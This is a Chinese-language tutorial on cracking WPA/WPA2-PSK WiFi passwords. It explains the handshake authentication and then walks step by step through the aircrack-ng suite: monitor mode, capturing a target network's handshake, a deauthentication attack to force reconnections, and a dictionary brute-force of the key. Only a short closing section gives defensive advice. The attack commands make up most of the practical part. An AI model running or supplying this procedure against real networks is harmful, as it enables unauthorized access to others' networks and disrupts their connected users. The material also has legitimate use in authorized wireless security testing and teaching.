## WiFi密码破解与防范

此教程为wifi无线密码破解攻略，建议以探讨学术和热爱网络技术为学习目标。 

## 1 WIFI破解原理

本章节主要介绍WIFI认证方式和认证具体过程，还有如何利用WIFI的认证再破解的基本原理。

### 1.1 wifi认证方式

1、不启用安全

2、WE

3、WPA/WPA2-PSK

4、WPA/WPA2 802.1X （radius认证）

一般我们设置主流的都是第三种。

具体在路由器的配置界面一般如下图所示：

![img](http://image.3001.net/images/20150204/14230352482243.png)

### 1.2 WPA-PSK的认证过程：

![img](http://image.3001.net/images/20150204/14230353336924.png)

> 1、无线AP定期发送beacon数据包，使无线终端更新自己的无线网络列表。
>
> 2、无线终端在每个信道（1-13）广播ProbeRequest（非隐藏类型的WiFi含ESSID，隐藏类型的WiFi不含ESSID）
>
> 3、每个信道的AP回应，ProbeResponse，包含ESSID，及RSN信息
>
> 4、无线终端给目标AP发送AUTH包。AUTH认证类型有两种，0为开放式、1为共享式（WPA/WPA2必须是开放式）
>
> 5、AP回应网卡AUTH包
>
> 6、无线终端给AP发送关联请求包associationrequest数据包 7、AP给无线终端发送关联响应包associationresponse数据包
>
> 8、EAPOL四次握手进行认证（握手包是破解的关键）
>
> 9、完成认证可以上网。

### 1.3 WPA-PSK认证四次握手认证的过程

![img](http://image.3001.net/images/20150204/1423035431460.png)

### 1.4 WPA-PSK破解原理

用我们字典中的PSK+ssid先生成PMK（此步最耗时，是目前破解的瓶颈所在），然后结合握手包中的客户端MAC，AP的BSSID，A-NONCE，S-NONCE计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。

如图所示：

![img](http://image.3001.net/images/20150204/142303547147.png)

## 2 WIFI破解过程

### 2.1 破解wifi实战

**（1）. 关闭网络管理器，为了防止干扰**

```
service  network-manager stop

```

```
airmon-ng check kill

```

**（2）. 查看本机电脑的无线网卡**

```
ifconfig

```

或者

```
iwconfig

```

找到是否有wlan0无线网卡的，如果没有无线网卡请插入usb无线网卡。 如果是插入usb网卡请

```
ifconfig wlan0 up

```

加载无线网卡

**（3）. 激活网卡为监听（monitor）模式**

```
airmon-ng start wlan0

```

![img](http://image.3001.net/images/20150204/14230355012283.png)

得到监控模式下的设备名是mon0 有的可能是wlan0mon，请记住这个名字

**（4）. 探测周围无线网络**

```
airodump-ng mon0

```

查看周边路由AP的信息。

个人经验一般信号强度大于-70的可以进行破解，大于-60就最好了，小于-70的不稳定，信号比较弱。（信号强度的绝对值越小表示信号越强）

![img](http://image.3001.net/images/20150204/14230355329489.png!small) ![img](http://image.3001.net/images/20150204/14230355587380.png!small)

![img](http://image.3001.net/images/20150204/14230356574818.png!small)

**（5）. 选择要破解的WiFi，有针对性的进行抓握手包**

```
airodump-ng --ignore-negative-one -w  /tmp/test.cap-c 11 --bssid 40:16:9F:76:E7:DE mon0

```

参数说明：-w 保存数据包的文件名 –c 信道 –bssid ap的mac地址 (注意test.cap会被重命名)，也可以用其他工具抓包比如：wireshark、tcpdump，抓到握手包会有提示。

**（6）. 模拟目标wifi，想可信客户端发起断链攻击**

为了顺利抓到握手包，我们需要使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包。（注意：抓握手包破解必须有合法的客户端才行。）

攻击命令如下

```
aireplay-ng -0 3 -a B8:A3:86:63:B4:06 -c 00:18:1a:10:da:c9 -x 200 mon0

```

参数说明：-0 Deautenticate 冲突模式 3 发包次数 -x 发包速度

![img](http://images.51cto.com/files/uploadimg/20110526/15005025.jpg)

如果攻击成功,airodump-ng捕获`handshake` ,此时可以ctrl+c终止airodump-ng抓包。

**（7）. 通过字典暴力破解捕获到的加密密码**

```
aircrack-ng-w pass-haoyong.txt test-03.cap

```

参数解释：-w 字典路径

![img](http://image.3001.net/images/20150204/14230358365729.png!small)

如果字典中有对方的密码，那么经过一段时间就会破解成功，最终会出现 **FOUND KEY!**字样.

![img](http://images.51cto.com/files/uploadimg/20110526/15005029.jpg)

**（8）. 破解成功，恢复网络环境**

```
service  network-manager start
```

### 2.2 有关WIFI安全建议

（1） 路由密码不要设置WEP方式加密的，因为WPA2-PSK的加密方式是不可逆的，但是wep确实可逆的，不论你设置的密码多么复杂，都会被秒破。

（2） 加密方式选择WPA2-PSK，密码不要设置常用面比如简单的123456aa这种。一般网上流传的密码字典会包括这种密码，所以很多常用字典可以轻易破解

（3）密码难度稍微复杂一些，长度不要局限8位，即可。